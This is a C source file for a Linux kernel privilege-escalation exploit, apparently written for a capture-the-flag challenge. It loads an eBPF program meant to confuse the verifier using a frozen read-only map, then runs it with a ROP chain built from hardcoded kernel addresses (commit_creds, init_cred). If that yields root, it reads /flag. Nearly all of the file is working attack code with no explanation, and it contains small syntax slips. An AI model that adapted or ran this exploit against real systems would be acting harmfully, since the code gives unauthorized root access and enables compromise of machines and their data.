#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdarg.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <linux/bpf.h>
#include <linux/bpf_common.h>
#include <syscall.h>

#include "bpf_program.h"

#define PAGESZ 0x1000
#define ARR_MAP_SIZE 0x1000
#define VERIFIER_LOG_SZ 0x20 * PAGESZ

char* verifier_log;
uint64_t pop_rdi = 0xffffffff8130d3de;
uint64_t init_cred = 0xffffffff82a52fa0;
uint64_t commit_creds = 0xffffffff810c3c50;
uint64_t _fork = 0xffffffff8108e5b0;
uint64_t msleep = 0xffffffff81141be0;

void log_err(const char *format, ...) {
    if (!format) {
        exit(EXIT_FAILURE);
    }

    fprintf(stderr, "%s", "[-] ");
    va_list args;
    va_start(args, format);
    vfprintf(stderr, format, args);
    va_end(args);
    fprintf(stderr, "\n");
    fflush(stderr);

    exit(EXIT_FAILURE);
}

#define SAFE(result) \
({ \
    typeof(result) _r = (result); \
    if (_r < 0) log_err("[-] %s:%d: returned %p", __FILE__, __LINE__, _r); \
    _r; \
});

#define PROG_SAFE(result) \
({ \
    typeof(result) _r = (result); \
    if (_r < 0) {print_log(); log_err("[-] %s:%d: returned %p", __FILE__, __LINE__, _r); }\
    _r; \
});


int bpf(int cmd, union bpf_attr *attr, unsigned int size) {
  return syscall(SYS_bpf, cmd, attr, size);
}

void debug() {
	printf("Debug\n");
    getchar();
}

void print_log() {
  printf("=========================================\n%s\n=========================================\n", verifier_log);
}

int main() {
  verifier_log = (char*)SAFE(mmap(NULL, VERIFIER_LOG_SZ, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANON, -1, 0));

  union bpf_attr map = {
    .map_type = BPF_MAP_TYPE_ARRAY,
    .key_size = 4,
    .value_size = 8,
    .max_entries = 1,
    .map_flags = BPF_F_RDONLY_PROG
  };

  // create map
  int map_fd = SAFE(bpf(BPF_MAP_CREATE, &map, sizeof(map)));

  int key = 0;
  uint64_t value = 0; // used confuse ebpf verifier
  union bpf_attr update = {
    .map_fd = map_fd,
    .key = &key,
    .value = &value,
    .flags = 0
  };
  // update the map with smth
  SAFE(bpf(BPF_MAP_UPDATE_ELEM, &update, sizeof(update)));

  union bpf_attr freeze = {
    .map_fd = map_fd
  };
  // freeze the map
  SAFE(bpf(BPF_MAP_FREEZE, &freeze, sizeof(update)));

  int instrs_cnt = sizeof(instrs) / 8;
  printf("count: %d/%d = %d\n", sizeof(instrs), 8, instrs_cnt);

  union bpf_attr prog = {
    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
    .insn_cnt = instrs_cnt,
    .insns = instrs,
    .license = "",
    .log_level = 3,
    .log_buf = (long long unsigned int)verifier_log,
    .log_size = VERIFIER_LOG_SZ,
  };

  int prog_fd = PROG_SAFE(bpf(BPF_PROG_LOAD, &prog, sizeof(prog)));

  char* data_in = (char*)SAFE(mmap((void*)0xdeadbeee000, PAGESZ * 2, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0))
  char* data_out = data_in + PAGESZ;

  uint64_t* c = data_in + 0x20;
  *c++ = pop_rdi;
  *c++ = init_cred;
  *c++ = commit_creds;
  *c++ = _fork;  // telefork
  *c++ = msleep;

  union bpf_attr run = {
    .test.data_in = data_in,
    .test.data_size_in = 0x400,
    
    .test.data_out = data_out,
    .test.data_size_out = 0x400,
    .test.prog_fd = prog_fd,
  };

  SAFE(bpf(BPF_PROG_TEST_RUN, &run, sizeof(run)));

  if (getuid() == 0) {
    system("cat /flag");
  }

  // print_log();
  debug();
  return 0;
}